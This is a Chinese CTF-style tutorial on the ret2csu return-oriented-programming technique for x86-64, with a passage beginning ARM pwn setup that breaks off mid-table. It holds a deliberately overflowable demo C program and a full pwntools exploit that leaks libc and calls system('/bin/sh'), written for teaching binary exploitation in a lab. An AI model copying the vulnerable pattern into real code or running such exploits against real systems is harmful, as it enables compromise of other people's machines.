<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="b647f0d0e85834fdde5440d4ed2eb5ef">x86&amp;arm ret2csu</h1>
<h1 data-content="1" id="454041743097d1078e49a9098e172e5e">前言</h1>
<p>前几天学习arm架构下的pwn的时候发现大多用的都是ret2csu打法，正好结合复习一下ret2csu。</p>
<h2 data-content="1" id="cc8ecaf84178a296b0013e42a173865b">x86下的ret2csu</h2>
<h3 data-content="1" id="0680443abb1f8b81dc74eab37d5b5c2e">基础例题</h3>
<p><strong>demo源码</strong></p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vul</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">){</span>
    <span class="n">init</span><span class="p">();</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Hello, World</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">13</span><span class="p">);</span>
    <span class="n">vul</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>
<p><strong>gcc编译</strong></p>
<pre><code>gcc -z lazy -fno-stack-protector -no-pie -o csu csu.c</code></pre>
<p><strong>file&amp;checksec</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200049-908e6eb8-2950-1.png"/></p>
<p><strong>IDA静态分析一下</strong></p>
<p>main()</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Hello, World</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mh">0xDuLL</span><span class="p">);</span>
  <span class="n">vul</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>vul()</p>
<div class="highlight"><pre><span></span><span class="kt">ssize_t</span> <span class="nf">vul</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-80h] BYREF</span>

  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200uLL</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>典型栈溢出，不多说了，现在就是如何构造rop链的问题</p>
<p>ROPgadget看一下</p>
<pre><code>Gadgets information
============================================================
0x00000000004012ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012b0 : pop r14 ; pop r15 ; ret
0x00000000004012b2 : pop r15 ; ret
0x00000000004012ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012af : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040115d : pop rbp ; ret
0x00000000004012b3 : pop rdi ; ret
0x00000000004012b1 : pop rsi ; pop r15 ; ret
0x00000000004012ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret</code></pre>
<p>x86架构下64位程序前6个参数是存储在rdi,rsi,rdx,rcx,r8,r9的，但是看了一下，没有可以直接利用的gadget</p>
<p>但是需要找到某些函数去控制rdx才能利用write函数去泄露libc，然后才能进行接下来的操作</p>
<p>解决这种问题的方法就叫做ret2csu，主要用到的是__libc_csu_init函数。</p>
<p>__libc_csu_init函数的作用是对将要链接进elf的libc进行初始化。</p>
<p>相关汇编代码</p>
<pre><code>.text:0000000000401250 __libc_csu_init proc near               ; DATA XREF: _start+1A↑o
.text:0000000000401250 ; __unwind {
.text:0000000000401250                 endbr64
.text:0000000000401254                 push    r15
.text:0000000000401256                 lea     r15, __frame_dummy_init_array_entry
.text:000000000040125D                 push    r14
.text:000000000040125F                 mov     r14, rdx
.text:0000000000401262                 push    r13
.text:0000000000401264                 mov     r13, rsi
.text:0000000000401267                 push    r12
.text:0000000000401269                 mov     r12d, edi
.text:000000000040126C                 push    rbp
.text:000000000040126D                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:0000000000401274                 push    rbx
.text:0000000000401275                 sub     rbp, r15
.text:0000000000401278                 sub     rsp, 8
.text:000000000040127C                 call    _init_proc
.text:0000000000401281                 sar     rbp, 3
.text:0000000000401285                 jz      short loc_4012A6
.text:0000000000401287                 xor     ebx, ebx
.text:0000000000401289                 nop     dword ptr [rax+00000000h]
.text:0000000000401290
.text:0000000000401290 loc_401290:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000401290                 mov     rdx, r14
.text:0000000000401293                 mov     rsi, r13
.text:0000000000401296                 mov     edi, r12d
.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]
.text:000000000040129D                 add     rbx, 1
.text:00000000004012A1                 cmp     rbp, rbx
.text:00000000004012A4                 jnz     short loc_401290
.text:00000000004012A6
.text:00000000004012A6 loc_4012A6:                             ; CODE XREF: __libc_csu_init+35↑j
.text:00000000004012A6                 add     rsp, 8
.text:00000000004012AA                 pop     rbx
.text:00000000004012AB                 pop     rbp
.text:00000000004012AC                 pop     r12
.text:00000000004012AE                 pop     r13
.text:00000000004012B0                 pop     r14
.text:00000000004012B2                 pop     r15
.text:00000000004012B4                 retn</code></pre>
<p>csu这种利用方式分为两部分第一部分就是从地址0x04012AA到最后，pop了rbx，rbp，r12，r13，r14，r15六个寄存器。第二部分是从0x0401290到0x04012A4，在这里会发现这些gadget通过r14寄存器控制了rdx，通过r13控制了rsi，通过r12控制了edi。</p>
<p>再往下走回看到一个cmp，比较rbp和rbx是否相等，如果相等不会跳转下一个循环，不相等责向下执行。</p>
<p>这样的话我们就可以利用这个gadget去控制参数寄存器，然后去劫持程序执行流leak libc至getshell。</p>
<pre><code>PS:这里要注意
.text:000000000040129D                 add     rbx, 1
.text:00000000004012A1                 cmp     rbp, rbx
这里是进行了rbx+1之后再进行比较的</code></pre>
<p>gdb动调看溢出字节</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200102-9831ee74-2950-1.png"/></p>
<pre><code>128+8=136</code></pre>
<p>然后我们利用垃圾字节覆盖rbp后返回地址填入我们的__libc_csu_init那一串pop rbx的起始地址</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200108-9c318534-2950-1.png"/></p>
<pre><code>rbx -&gt;0
rbp -&gt;1
r12 -&gt;arg1
r13 -&gt;arg2
r14 -&gt;arg3
r15 -&gt;func_addr(这里是因为call qword ptr [r15+rbx*8]，我们将rbx设置为0了，这里就相当于call func了)

call函数为跳转到某地址内所保存的地址，应该使用got表中的地址
ret指令必须跳转到一段有效的汇编指令，所以应为plt表中的地址</code></pre>
<p>这里画一下最基本的ret2csu的栈帧，</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200117-a1904272-2950-1.png"/></p>
<p>第一个框就是说明</p>
<pre><code>r14 -&gt;rdx
r13 -&gt;rsi
r12 -&gt;rdi</code></pre>
<p>第二个框</p>
<pre><code>rbx=rbx+1
rbp=rbx -&gt;继续执行不跳转
rbp != rbx -&gt; jmp loc_401290</code></pre>
<p>第三个框</p>
<pre><code>rsp=rsp+8
抬高一个字长，所以要执行完gadget1后加上一个垃圾字长</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200138-ae13e56c-2950-1.png"/></p>
<p>第一个payload</p>
<pre><code>这里是为了泄露write的got表地址
r12 -&gt; 1
r13 -&gt;write_got
r14 -&gt;0x8
r15 -&gt;write_got
ret -&gt;gadget2
p64(1)*7 -&gt;主要是上面我说的padding -&gt;新一轮的rsp+8,rbx,rbp,r12,r13,r14,r15</code></pre>
<p>第二个payload</p>
<pre><code>这里是为了调用read函数从而将system,binsh写入bss段
r12 -&gt;0
r13 -&gt;bss段地址
r14 -&gt;0x20
r15 -&gt;read_got</code></pre>
<p>第三个payload</p>
<pre><code>这里是传入我们写入system和binsh的地址
r12 -&gt;binsh的地址 -&gt;bss段地址为0x404060-&gt;我们传入的是system+binsh，所以binsh的地址为0x404068
r13 -&gt;0
r14 -&gt;0
r15 -&gt;system</code></pre>
<p>exp:</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">'./csu'</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./csu'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
<span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\xf7</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'gnome-terminal'</span><span class="p">,</span><span class="s1">'-x'</span><span class="p">,</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'-c'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'b *$rebase(0x13aa)'</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">ret_csu</span><span class="p">(</span><span class="n">r12</span><span class="p">,</span> <span class="n">r13</span><span class="p">,</span> <span class="n">r14</span><span class="p">,</span> <span class="n">r15</span><span class="p">,</span> <span class="n">last</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="s1">'a'</span>  
    <span class="c1">#构造栈溢出的padding</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">first_csu</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'a'</span> <span class="o">*</span> <span class="mi">8</span>    
    <span class="c1">#gadgets1的地址</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="c1">#rbx=0, rbp=1</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">r12</span><span class="p">)</span>
    <span class="c1">#call调用的地址</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">r13</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r14</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r15</span><span class="p">)</span>
    <span class="c1">#三个参数的寄存器</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">second_csu</span><span class="p">)</span>
    <span class="c1">#gadgets2的地址</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'a'</span> <span class="o">*</span> <span class="mi">56</span>
    <span class="c1">#pop出的padding</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">last</span><span class="p">)</span>
    <span class="c1">#函数最后的返回地址</span>
    <span class="k">return</span> <span class="n">payload</span>
<span class="c1">#做熟练了可以直接用这个通用Payload</span>

<span class="n">write_got</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'write'</span><span class="p">]</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">'write_got'</span><span class="p">,</span><span class="n">write_got</span><span class="p">)</span>
<span class="n">main</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'main'</span><span class="p">]</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">'main'</span><span class="p">,</span><span class="n">main</span><span class="p">)</span>
<span class="n">read</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">'read'</span><span class="p">,</span><span class="n">read</span><span class="p">)</span>



<span class="sd">"""</span>
<span class="sd">.text:00000000004012AA                 pop     rbx</span>
<span class="sd">.text:00000000004012AB                 pop     rbp</span>
<span class="sd">.text:00000000004012AC                 pop     r12</span>
<span class="sd">.text:00000000004012AE                 pop     r13</span>
<span class="sd">.text:00000000004012B0                 pop     r14</span>
<span class="sd">.text:00000000004012B2                 pop     r15</span>
<span class="sd">.text:00000000004012B4                 retn</span>
<span class="sd">"""</span>
<span class="n">pl</span><span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">136</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4012AA</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x404018</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401290</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Hello, World</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span>

<span class="n">write</span><span class="o">=</span><span class="n">uu64</span><span class="p">(</span><span class="n">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">'write'</span><span class="p">,</span><span class="n">write</span><span class="p">)</span>

<span class="n">libcbase</span><span class="o">=</span><span class="n">write</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'write'</span><span class="p">]</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">'libcbase'</span><span class="p">,</span><span class="n">libcbase</span><span class="p">)</span>

<span class="sd">"""</span>
<span class="sd">.text:0000000000401290                 mov     rdx, r14</span>
<span class="sd">.text:0000000000401293                 mov     rsi, r13</span>
<span class="sd">.text:0000000000401296                 mov     edi, r12d</span>
<span class="sd">.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span>
<span class="sd">.text:000000000040129D                 add     rbx, 1</span>
<span class="sd">.text:00000000004012A1                 cmp     rbp, rbx</span>
<span class="sd">.text:00000000004012A4                 jnz     short loc_401290</span>
<span class="sd">"""</span>

<span class="n">pl2</span><span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">136</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4012AA</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x404060</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401290</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pl2</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'system'</span><span class="p">])</span><span class="o">+</span><span class="sa">b</span><span class="s1">'/bin/sh</span><span class="se">\00</span><span class="s1">'</span><span class="p">)</span>

<span class="n">pl3</span><span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">136</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4012AA</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x404068</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x404060</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401290</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'Hello, World</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="n">pl3</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="d5272b3263fc4d809695670238aa5a8d">后话</h3>
<p>这里说明一下为什么ret2csu不适用于32位</p>
<h4 data-content="1" id="37e560cfc3697b67b4ed9c4a9760b145">实例源码</h4>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vul</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">){</span>
    <span class="n">init</span><span class="p">();</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Hello, World</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">13</span><span class="p">);</span>
    <span class="n">vul</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>
<p>gcc编译</p>
<pre><code>gcc -z lazy -fno-stack-protector -no-pie -m32 -o csu32 csu.c</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200156-b86217d2-2950-1.png"/></p>
<p>32位的函数调用栈和64位是不同的，是直接栈上传参，这里可以看到前两个参数是从栈中传出，第三个是通过edi传输的</p>
<p>看一下我们能不能控制这两个参数</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200203-bc97e4bc-2950-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200208-bfb274aa-2950-1.png"/></p>
<p>发现是不行的，这也就是为什么32位下不能ret2csu打法</p>
<h2 data-content="1" id="b91a75d89e169b933d9c1d1542ae1e61">arm架构下的ret2csu</h2>
<p>我相信有很多人没有进行arm架构的学习，这里顺便讲解一下基础知识</p>
<h3 data-content="1" id="e72906ad03d9873fe3b5e97830d8a82d">环境配置</h3>
<p>交叉编译器<a href="https://blog.csdn.net/qq_43826212/article/details/108858626" target="_blank">https://blog.csdn.net/qq_43826212/article/details/108858626</a></p>
<p>配置环境<a href="https://askubuntu.com/questions/250696/how-to-cross-compile-for-arm" target="_blank">https://askubuntu.com/questions/250696/how-to-cross-compile-for-arm</a></p>
<h3 data-content="1" id="9c0f09f2e3c046afd6b9ddfa119aa365">运行程序</h3>
<p>如果程序是静态链接并且是32位 arm架构的话，输入qemu-arm ./程序名</p>
<p>如果程序是静态链接并且是aarch64架构的话，输入qemu-aarch ./程序名</p>
<p>如果程序是动态链接且是32位 arm架构的话，输入qemu-arm -L /usr/arm-linux-gnueabihf ./程序名</p>
<p>如果程序是动态链接且是aarch64架构的话，输入qemu-aarch64 -L /usr/aarch64-linux-gnu ./程序名</p>
<h3 data-content="1" id="d202b343797527d13f82763ebb4e5ded">启动调试</h3>
<p><strong>启动调试和运行程序的命令很相似，仅仅是加了一个参数-g 然后后面跟一个端口</strong>。</p>
<p>比如程序是动态链接的32位 arm架构的话，输入qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./程序名</p>
<p>这个1234是你指定的端口，指定别的端口也可以。然后参照运行程序那四个命令以及上面这个命令，就可以依次类推出调试aarch64架构的命令了。</p>
<p>此时再打开另一个终端，输入gdb-multiarch（<strong>必须是用pwndbg，如果是peda的话，是没法正常调试的</strong>）</p>
<p>然后再输入target remote localhost:1234 连接到刚才开的那个端口。</p>
<p>栈帧</p>
<p>在ARM上，函数的栈帧是由SP寄存器和FP寄存器来界定的</p>
<h3 data-content="1" id="08f1836b2728dc09b300e8b7793ef3eb">ARM寄存器</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230723200242-d3ec3e9c-2950-1.png"/></p>
<h3 data-content="1" id="83dfe8e9a4820ea385eb323cf300decb">ARM指令</h3>
<table>
<thead>
<tr>
<th>指令</th>
<th>功能</th>
<th>指令</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>MOV</td>
<td>移动数据</td>
<td>EOR</td>
<td>按位异或</td>
</tr>
<tr>
<td>MVN</td>
<td>移动数据并取反</td>
<td>LDR</td>
